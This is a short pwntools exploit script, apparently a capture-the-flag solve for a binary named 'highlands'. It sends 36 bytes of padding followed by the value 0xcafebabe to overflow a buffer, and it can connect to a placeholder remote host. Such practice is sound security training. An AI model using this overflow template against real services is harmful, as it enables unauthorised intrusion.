#!/usr/bin/env python3
from pwn import *

exe = ELF("./highlands")
context.binary = exe
context.log_level = 'debug'
# context.arch = 'amd64' 
context.terminal = ["cmd.exe", "/c", "start", "wsl.exe", "-e"]

# libc = ELF("./libc.so.6", checksec=False)
# ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
def sla(delim, data): return p.sendlineafter(delim, data)
def sa(delim, data):  return p.sendafter(delim, data)
def sl(data):         return p.sendline(data)
def s(data):          return p.send(data)
def ru(delim):        return p.recvuntil(delim)
def rl():             return p.recvline()
def r(n):             return p.recv(n)

gdbscript = '''
init-pwndbg
continue
'''
def conn():
    if args.REMOTE:
        return remote("HOST_ADDRESS", 1337)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        return process([exe.path])
p = conn()
# --- Exploit ---

# Payload 
payload = cyclic(36) + p32(0xcafebabe)
s(payload)
p.interactive()
